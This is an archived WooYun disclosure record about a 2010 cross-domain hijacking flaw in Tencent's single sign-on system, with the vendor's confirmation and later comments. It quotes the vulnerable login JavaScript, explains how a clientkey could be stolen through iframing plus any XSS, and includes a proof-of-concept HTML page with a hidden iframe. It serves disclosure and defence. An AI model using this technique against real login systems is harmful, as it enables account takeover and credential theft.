{"id": 24183, "wybug_id": "wooyun-2010-0197", "wybug_title": "腾讯单点登录系统跨域劫持漏洞 Ⅱ", "wybug_corp": "腾讯", "wybug_author": "rayh4c", "wybug_date": "2010-08-15 00:56", "wybug_open_date": "2010-09-14 03:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理", "安全架构设计导致攻击界面变大", "腾讯认证"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2010-08-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2010-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2010-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2010-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2010-09-14：\t细节向公众公开  简要描述： 腾讯单点登录系统在安全架构上存在安全缺陷，黑客可以轻易通过一些漏洞跨域劫持单点登录系统，从而获取客户端QQ所有相关服务的权限。细节补充：和上次，上上次的漏洞一样，可以通过网页挂马的方式远程获取QQ客户端的clientkey. 详细说明：  单点登录系统网页的javascript的跨域设置是通过点击按钮的事件触发的，如下流程：http://imgcache.qq.com/ptlogin/ac/v7/js/xui.js--------------------------------------------------------if (!flag) {    g_domain = \"qq.com\"}没有FLAG参数，G_DOMAIN设置成QQ.COM........function unloadpage(){    document.domain = g_domain;unloadpage函数进行跨域设置.......function hummer_login(E, D, A, F){    if (A == \"\") {        A = \"jump\"    }    var C = \"http://ptlogin2.\" + D + \"/\" + A + \"?clientuin=\" + E.uin + \"&clientkey=\" + E.key + \"&keyindex=9\";    if (F != null && F != \"\") {        var B = decodeURIComponent(F);        if (B.indexOf(\"#\") > -1) {            B = B.replace(/#/g, \"%23\")        }        C += (\"&\" + B)    }    switch (parseInt(g_qtarget)) {        case 0:            unloadpage();            parent.location.href = C;            break;页面转跳前运行 unloadpage()函数........-------------------------------------------------------黑客可以直接IFRAME单点登录系统的网页，先通过设置location全局变量让网页转跳失败，然后再通过腾讯网站任意的一个XSS漏洞，跨域获取用户的clientkey。同局域网内可以直接用clientkey使用单点登录系统，非局域网用户可以强制用户单点登录获取用户的session。     漏洞证明：  真正的攻击场景需要腾讯网站的一个XSS配合，攻击方式可以做到用户在随便在任意一个网站点击链接，就可以获取clientkey！下面给一个POC，完美EXP太H太暴力了，就不给了：\n<html><head><script>var location = '';function click_hijack(obj){document.all(\"div_xss\").style.display=obj;document.all(\"div_xss\").style.top=event.clientY+document.body.scrollTop + 220;document.all(\"div_xss\").style.left=event.clientX+document.body.scrollLeft - 340;}</script></head><body><br><div align=\"center\"><a id=\"click\" href='' onMouseMove=\"click_hijack('block')\"  onmouseout=\"click_hijack('none')\">test1</a><br><br><a id=\"click\" href='' onMouseMove=\"click_hijack('block')\" onmouseout=\"click_hijack('none')\">test2</a><br><br></div><div id=\"div_xss\" style=\"position:absolute;\" ><iframe id=\"victim\" src=\"http://xui.ptlogin2.qq.com/cgi-bin/qlogin?domain=qq.com\" scrolling=\"no\" style=\"position: absolute;left: 200;bottom: 200;\" height=\"90px;\" width=\"200px;\"></iframe></div></body></html>\n   修复方案：  防止单点登录系统服务被非信任域引用。   版权声明：转载请注明来源 rayh4c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2010-08-15 09:04 厂商回复： 收到，我们尽快确认 最新状态： 2010-08-24：已修复  ", "replys": "漏洞评价：\n评论\n     2012-07-10 14:23 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  牛逼啊，学习    \n     2013-03-07 11:38 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n  药药，切克闹    \n     2013-03-09 23:11 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  没有完整的，看不懂呢..    \n     2014-08-06 11:20 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  完美EXP太H了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}